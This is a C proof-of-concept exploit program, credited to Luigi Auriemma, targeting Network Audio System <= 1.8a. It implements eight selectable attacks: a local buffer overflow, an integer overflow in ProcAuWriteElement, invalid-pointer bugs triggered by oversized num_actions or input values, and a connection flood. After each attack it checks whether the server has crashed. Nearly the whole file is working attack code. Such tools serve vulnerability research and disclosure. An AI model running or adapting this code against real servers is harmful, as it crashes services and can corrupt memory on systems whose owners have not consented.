/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close       closesocket
    #define sleep       Sleep
    #define usleep(x)   sleep(x / 1000)
    #define ONESEC      1000
    typedef uint32_t    in_addr_t;
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
    #include <sys/times.h>
    #include <sys/un.h>
    #include <fcntl.h>

    #define ONESEC      1
#endif



#define VER                 "0.1"
#define BUFFSZ              0x10000
#define PAD4(x)             ((x + 3) & ~3)
#define X(x)                ((au##x *)buff)



#define AUTHPROTO           "MIT-MAGIC-COOKIE-1"
#define AUDIO_STREAMS_PATH  "/dev/Au/server."
#define MAXCLIENTS          128
#define CLIENTOFFSET        22
#define RESOURCE_ID_MASK    0x3FFFFF
#define CLIENT_BITS(id)     ((id) & 0x1fc00000)
#define CLIENT_ID(id)       ((int)(CLIENT_BITS(id) >> CLIENTOFFSET))
#define SERVER_BIT          0x20000000
#define B16
#define B32
typedef uint8_t     CARD8;
typedef int8_t      INT8;
typedef uint8_t     BYTE;
typedef uint8_t     AUBOOL;
typedef uint16_t    CARD16;
typedef int16_t     INT16;
typedef uint32_t    CARD32;
typedef int32_t     INT32;
#define notdef
#include "audio.h"
#include "Aproto.h"



int tcp_send(int sd, u_char *data, int size);
int tcp_recv(int sd, u_char *data, int len);
int get_endian(void);
void delimit(u_char *p);
void get_net_peer(struct sockaddr_in *peer);
in_addr_t resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
#ifndef WIN32
    struct  sockaddr_un peeru;
#endif
    struct  sockaddr_in peer;
    auConnClientPrefix  ClientPrefix;
    auConnSetup         Setup;
    u_int   len;
    int     sd          = 0,
            i,
            attack,
            devid       = 0,
            verify      = 0;
    u_char  *buff;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Network Audio System <= 1.8a (svn 231) multiple vulnerabilities "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <attack>\n"
            "\n"
            "Attack:\n"
            "1 = accept_att_local buffer overflow through USL connection\n"
            "2 = server termination through unexistent ID in AddResource\n"
            "3 = bcopy crash caused by integer overflow in ProcAuWriteElement\n"
            "4 = invalid memory pointer caused by big num_actions in ProcAuSetElements\n"
            "5 = another invalid memory pointer caused by big num_actions in ProcAuSetElements\n"
            "6 = invalid memory pointer in compileInputs\n"
            "7 = exploits bug 3 in read mode (requires something playing on the server)\n"
            "8 = NULL pointer caused by too much connections\n"
            "\n", argv[0]);
        exit(1);
    }

    attack = atoi(argv[1]);

    if((attack <= 0) || (attack >= 9)) {
        printf("\nError: wrong attack number\n");
        exit(1);
    }

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    if(attack == 1) {
#ifdef WIN32
        printf("\nError: this is a local bug, you must use it on a Unix system\n");
        exit(1);
#else
        sprintf(buff, "%s%d", AUDIO_STREAMS_PATH, 0);
        printf("- open %s\n", buff);
        sd = open(buff, O_RDWR);
        if(sd < 0) std_err();

        buff[0] = 0xff;
        send(sd, buff, 1, 0);

        memset(buff, 'a', 0xff);
        send(sd, buff, 0xff, 0);

        close(sd);
        exit(1);
#endif
    }

    peer.sin_addr.s_addr = INADDR_NONE;

redo:
    if(peer.sin_addr.s_addr == INADDR_NONE) {
#ifdef WIN32
        get_net_peer(&peer);
#else
        sprintf(peeru.sun_path, "%s%d", AU_DEFAULT_UNIX_PATH, 0);
        peeru.sun_family = AF_UNIX;
        printf("- open %s\n", peeru.sun_path);
        sd = socket(AF_UNIX, SOCK_STREAM, 0);
        if(sd < 0) std_err();
        if(connect(sd, (struct sockaddr *)&peeru, sizeof(peeru)) < 0) {
            perror("\nError");
            close(sd);
            if(verify) goto crashed;
            get_net_peer(&peer);
            goto redo;
        }
#endif
    } else {
        printf("- connect to %s:%hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));
        sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sd < 0) std_err();
        if(connect(sd, (struct sockaddr *)&peer, sizeof(peer)) < 0) {
            perror("\nError");
            if(verify) goto crashed;
            exit(1);
        }
    }
    if(verify) {
        printf("\n  Server doesn't seem vulnerable\n");
        exit(1);
    }

    if(attack == 8) {
        if(peer.sin_addr.s_addr != INADDR_NONE) usleep(50000);
        goto redo;
    }

    ClientPrefix.byteOrder                      = get_endian() ? 'B' : 'l';
    ClientPrefix.majorVersion                   = 2;
    ClientPrefix.minorVersion                   = 2;
    ClientPrefix.nbytesAuthProto                = 18;
    ClientPrefix.nbytesAuthString               = 16;

    if(tcp_send(sd, (void *)&ClientPrefix, sizeof(ClientPrefix))            < 0) goto error;

    if(tcp_send(sd, AUTHPROTO,  ClientPrefix.nbytesAuthProto)               < 0) goto error;

    memset(buff,    0,          ClientPrefix.nbytesAuthString); /* auth NOT supported here! */
    if(tcp_send(sd, buff,       ClientPrefix.nbytesAuthString)              < 0) goto error;

    if(tcp_recv(sd, buff, sizeof(auConnSetupPrefix))                        < 0) goto error;

    if(X(ConnSetupPrefix)->success == Au_Error) {
        if(tcp_recv(sd, buff, X(ConnSetupPrefix)->lengthReason)             < 0) goto error;
        printf("\nError: %s\n", buff);
        exit(1);
    }

    if(tcp_recv(sd, (void *)&Setup, sizeof(auConnSetup))                    < 0) goto error;

    if(tcp_recv(sd, buff, Setup.nbytesVendor)                               < 0) goto error;
    printf("  %s\n", buff);
    if(tcp_recv(sd, buff, Setup.numFormats)                                 < 0) goto error;
    if(tcp_recv(sd, buff, Setup.numElementTypes)                            < 0) goto error;
    if(tcp_recv(sd, buff, Setup.numWaveForms)                               < 0) goto error;
    if(tcp_recv(sd, buff, Setup.numActions)                                 < 0) goto error;
    for(i = 0; i < Setup.numDevices; i++) {
        if(tcp_recv(sd, buff, sizeof(auDeviceAttributes))                   < 0) goto error;
        if(!devid) devid = X(DeviceAttributes)->common.id;
        if(tcp_recv(sd, buff, X(DeviceAttributes)->common.description.len)  < 0) goto error;
        printf("  device: %s\n", buff);
        if(tcp_recv(sd, buff, X(DeviceAttributes)->device.num_children * 4) < 0) goto error;
    }
    for(i = 0; i < Setup.numBuckets; i++) {
        if(tcp_recv(sd, buff, sizeof(auBucketAttributes))                   < 0) goto error;
        if(tcp_recv(sd, buff, X(BucketAttributes)->common.description.len)  < 0) goto error;
        printf("  bucket: %s\n", buff);
    }
    for(i = 0; i < Setup.numRadios; i++) {
        if(tcp_recv(sd, buff, sizeof(auRadioAttributes))                    < 0) goto error;
        if(tcp_recv(sd, buff, X(RadioAttributes)->common.description.len)   < 0) goto error;
        printf("  radio:  %s\n", buff);
    }

    if(attack == 2) {
        printf("- try client ID: ");
        for(i = MAXCLIENTS - 1; i >= 0; i--) {
            printf("%d ", i);
            X(ResourceReq)->reqType             = Au_CreateFlow;
            X(ResourceReq)->length              = sizeof(auResourceReq) >> 2;
            X(ResourceReq)->id                  = (i << CLIENTOFFSET);
            if(tcp_send(sd, buff, sizeof(auResourceReq))                    < 0) break;
        }
        printf("\n");
        goto check;
    }

        /* Au_CreateFlow */

    X(ResourceReq)->reqType                     = Au_CreateFlow;
    X(ResourceReq)->length                      = sizeof(auResourceReq) >> 2;
    X(ResourceReq)->id                          = (1 << CLIENTOFFSET);
    if(tcp_send(sd, buff,       sizeof(auResourceReq))                      < 0) goto error;

        /* Au_SetElements */

    X(SetElementsReq)->reqType                  = Au_SetElements;
    X(SetElementsReq)->clocked                  = auTrue;
    X(SetElementsReq)->flow                     = (1 << CLIENTOFFSET);
    X(SetElementsReq)->numElements              = 3;
    X(SetElementsReq)->length                   = (sizeof(auSetElementsReq) + sizeof(auElement) * X(SetElementsReq)->numElements) >> 2;
    if(tcp_send(sd, buff,       sizeof(auSetElementsReq))                   < 0) goto error;

    X(ElementImportClient)->type                = AuElementTypeImportClient;        // element 1
    X(ElementImportClient)->sample_rate         = 44100;
    X(ElementImportClient)->format              = AuFormatLinearSigned16LSB;
    X(ElementImportClient)->num_tracks          = 2;
    X(ElementImportClient)->discard             = auTrue;
    X(ElementImportClient)->max_samples         = 0xffffffff;                       // <== BUG HERE!!!!
    X(ElementImportClient)->low_water_mark      = 0;
    X(ElementImportClient)->actions.num_actions = 0;
    if(tcp_send(sd, buff,       sizeof(auElement))                          < 0) goto error;

    X(ElementMultiplyConstant)->type            = AuElementTypeMultiplyConstant;    // element 2
    X(ElementMultiplyConstant)->input           = 0;
    X(ElementMultiplyConstant)->constant        = 0;
    if(tcp_send(sd, buff,       sizeof(auElement))                          < 0) goto error;

    X(ElementExportDevice)->type                = AuElementTypeExportDevice;        // element 3
    X(ElementExportDevice)->sample_rate         = 44100;
    X(ElementExportDevice)->input               = 1;
    X(ElementExportDevice)->num_samples         = 0;
    X(ElementExportDevice)->device              = devid;
    X(ElementExportDevice)->actions.num_actions = 0;
    if(tcp_send(sd, buff,       sizeof(auElement))                          < 0) goto error;

        /* Au_WriteElement */

    if(attack == 3) {
        len = 0xffff;

        X(WriteElementReq)->reqType             = Au_WriteElement;
        X(WriteElementReq)->element_num         = 0;
        X(WriteElementReq)->length              = PAD4(sizeof(auWriteElementReq) + len) >> 2;
        X(WriteElementReq)->flow                = (1 << CLIENTOFFSET);
        X(WriteElementReq)->num_bytes           = len;
        X(WriteElementReq)->state               = 0;
        if(tcp_send(sd, buff,   sizeof(auWriteElementReq))                  < 0) goto error;

        memset(buff, 'a', len);
        if(tcp_send(sd, buff,   len)                                        < 0) goto error;

        goto check;
    }

    if(attack == 4) {
        X(SetElementsReq)->reqType              = Au_SetElements;
        X(SetElementsReq)->clocked              = auTrue;
        X(SetElementsReq)->flow                 = (1 << CLIENTOFFSET);
        X(SetElementsReq)->numElements          = 2;
        X(SetElementsReq)->length               = (sizeof(auSetElementsReq) + sizeof(auElement) * X(SetElementsReq)->numElements) >> 2;
        if(tcp_send(sd, buff,   sizeof(auSetElementsReq))                   < 0) goto error;

        for(i = 0; i < 2; i++) {
            X(ElementImportClient)->type                = AuElementTypeImportClient;    // element 1
            X(ElementImportClient)->sample_rate         = 44100;
            X(ElementImportClient)->format              = AuFormatLinearSigned16LSB;
            X(ElementImportClient)->num_tracks          = 2;
            X(ElementImportClient)->discard             = auTrue;
            X(ElementImportClient)->max_samples         = 0xffffffff;
            X(ElementImportClient)->low_water_mark      = 0;
            X(ElementImportClient)->actions.num_actions = 0xffffff;                     // <== BUG HERE!!!!
                /* Note: the bug can be replicated with a big numElements value too! */
            if(tcp_send(sd, buff,   sizeof(auElement))                      < 0) goto error;
        }

        goto check;
    }

    if(attack == 5) {
        for(i = 0; i < 2; i++) {    // at least two times
            len = BUFFSZ / sizeof(auElementAction);

            X(SetElementsReq)->reqType              = Au_SetElements;
            X(SetElementsReq)->clocked              = auTrue;
            X(SetElementsReq)->flow                 = (1 << CLIENTOFFSET);
            X(SetElementsReq)->numElements          = 1;
            X(SetElementsReq)->length               = (sizeof(auSetElementsReq) + sizeof(auElement) * X(SetElementsReq)->numElements + len * sizeof(auElementAction)) >> 2;
            if(tcp_send(sd, buff,   sizeof(auSetElementsReq))                   < 0) goto error;

            X(ElementExportDevice)->type                = AuElementTypeExportDevice;
            X(ElementExportDevice)->sample_rate         = 44100;
            X(ElementExportDevice)->input               = 0;
            X(ElementExportDevice)->num_samples         = 0;
            X(ElementExportDevice)->device              = devid;
            X(ElementExportDevice)->actions.num_actions = len;
            if(tcp_send(sd, buff,   sizeof(auElement))                          < 0) goto error;

            len *= sizeof(auElementAction);

            memset(buff, 'a', len);
            if(tcp_send(sd, buff,   len)                                        < 0) goto error;
        }

        goto check;
    }

    if(attack == 6) {
        X(SetElementsReq)->reqType              = Au_SetElements;
        X(SetElementsReq)->clocked              = auTrue;
        X(SetElementsReq)->flow                 = (1 << CLIENTOFFSET);
        X(SetElementsReq)->numElements          = 1;
        X(SetElementsReq)->length               = (sizeof(auSetElementsReq) + sizeof(auElement) * X(SetElementsReq)->numElements) >> 2;
        if(tcp_send(sd, buff,   sizeof(auSetElementsReq))                   < 0) goto error;

        X(ElementExportMonitor)->type           = AuElementTypeExportMonitor;
        X(ElementExportMonitor)->event_rate     = 0;
        X(ElementExportMonitor)->input          = 0x6161;                               // <== BUG HERE!!!
        X(ElementExportMonitor)->format         = 0;
        X(ElementExportMonitor)->num_tracks     = 0;
        if(tcp_send(sd, buff,   sizeof(auElement))                          < 0) goto error;

        goto check;
    }

    if(attack == 7) {
        printf("- this attack works only if there is something playing on the server\n");

        X(ReadElementReq)->reqType              = Au_ReadElement;
        X(ReadElementReq)->element_num          = 0;
        X(ReadElementReq)->length               = sizeof(auReadElementReq) >> 2;
        X(ReadElementReq)->flow                 = (1 << CLIENTOFFSET);
        X(ReadElementReq)->num_bytes            = -1;   // this value is not important
        if(tcp_send(sd, buff,   sizeof(auReadElementReq))                   < 0) goto error;

        goto check;
    }

check:
    sleep(ONESEC);
    close(sd);

    printf("- the proof-of-concept is terminated, now I check if the server is still up\n");
    verify = 1;
    sleep(ONESEC);
    goto redo;

    return(0);
error:
    close(sd);
    printf("\nError: connection lost\n");
    return(1);

crashed:
    close(sd);
    printf("\n  Server IS vulnerable!!!\n");
    return(0);
}



int get_endian(void) {
    int     endian = 1;

    if(*(char *)&endian) endian = 0;
    return(endian);
}



int tcp_send(int sd, u_char *data, int size) {
    return(send(sd, data, PAD4(size), 0));
}



int tcp_recv(int sd, u_char *data, int size) {
    int     t,
            len;
    u_char  *p;

    len = PAD4(size);       // needed here
    p = data;

    while(len) {
        t = recv(sd, p, len, 0);
        if(t <= 0) return(-1);
        p   += t;
        len -= t;
    }
    data[size] = 0;         // NULL delimiter
    return(0);
}



void delimit(u_char *p) {
    while(*p && (*p != '\n') && (*p != '\r')) p++;
    *p = 0;
}



void get_net_peer(struct sockaddr_in *peer) {
    u_short port = AU_DEFAULT_TCP_PORT;
    u_char  host[64],
            *p;

    printf("- insert the host[:port] to which you want to connect (blank for localhost):\n  ");
    fgets(host, sizeof(host), stdin);
    delimit(host);
    if(!host[0]) strcpy(host, "127.0.0.1");

    p = strchr(host, ':');
    if(p) {
        *p = 0;
        port = atoi(p + 1);
    }

    peer->sin_addr.s_addr = resolv(host);
    peer->sin_port        = htons(port);
    peer->sin_family      = AF_INET;
}



in_addr_t resolv(char *host) {
    struct      hostent *hp;
    in_addr_t   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n",
                host);
            exit(1);
        } else host_ip = *(in_addr_t *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


